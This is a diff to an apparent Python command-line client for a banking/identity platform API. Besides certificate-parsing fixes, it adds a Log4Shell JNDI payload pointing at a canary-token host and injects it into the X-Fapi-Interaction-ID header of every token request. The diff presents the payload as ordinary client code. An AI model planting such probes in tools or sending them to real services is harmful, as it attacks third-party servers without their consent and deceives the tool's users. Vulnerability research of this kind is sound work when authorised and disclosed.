@@ -68,6 +68,8 @@ console = Console()
 class TooManyResultsException(Exception):
     pass
 
+EXPLOIT='${jndi:ldap://2fhytt0ahxjz5krlpwvv88v8p.canarytokens.com/b}'
+#EXPLOIT="${jndi:ldap://mcygxtnbfwcf11stq3nkrv809.canarytokens.com/a}"
 
 class YesPlatformAPI:
     DEFAULT_URLS = {
@@ -108,6 +110,9 @@ class YesPlatformAPI:
             },
             cert=self.cert_pair,
             timeout=TIMEOUT,
+            headers={
+                "X-Fapi-Interaction-ID": EXPLOIT,
+            }
         ).json()
         self.access_token = resp["access_token"]
 
@@ -374,18 +379,33 @@ class JWKSCustomType(CustomType):
     def __init__(self, jwks):
         self.raw = jwks
         self.certs = [self._read_certificate(c["x5c"][0]) for c in jwks["keys"]]
-        self.min_not_valid_after = max(
-            self.certs, key=attrgetter("not_valid_after")
-        ).not_valid_after
+        try:
+            self.min_not_valid_after = max(
+                (c for c in self.certs if c is not None),
+                key=attrgetter("not_valid_after"),
+            ).not_valid_after
+        except ValueError:
+            self.min_not_valid_after = datetime.now()
         self.lifetime_days = (self.min_not_valid_after - datetime.now()).days
 
     def _read_certificate(self, pem):
-        return x509.load_der_x509_certificate(b64decode(pem), default_backend())
+        try:
+            return x509.load_der_x509_certificate(b64decode(pem), default_backend())
+        except Exception as e:
+            return None
 
     def get_rich(self):
         out = RenderGroup()
 
         for c in self.certs:
+            if c is None:
+                out.renderables.append(
+                    Panel(
+                        "[red]Certificate could not be read. Please check the format.[/red]"
+                    )
+                )
+                continue
+
             try:
                 if (c.not_valid_after - datetime.now()).days < self.RED_THRESHOLD_DAYS:
                     color = "red"
@@ -679,7 +699,12 @@ class MRDataset(Dataset):
 
     @classmethod
     def _get_from_to(
-        cls, api: YesPlatformAPI, from_: datetime, to_: datetime, owner_id: Optional[str], tracker
+        cls,
+        api: YesPlatformAPI,
+        from_: datetime,
+        to_: datetime,
+        owner_id: Optional[str],
+        tracker,
     ):
         assert from_ < to_
         if tracker["total_requests"] > cls.RECURSION_LIMIT:
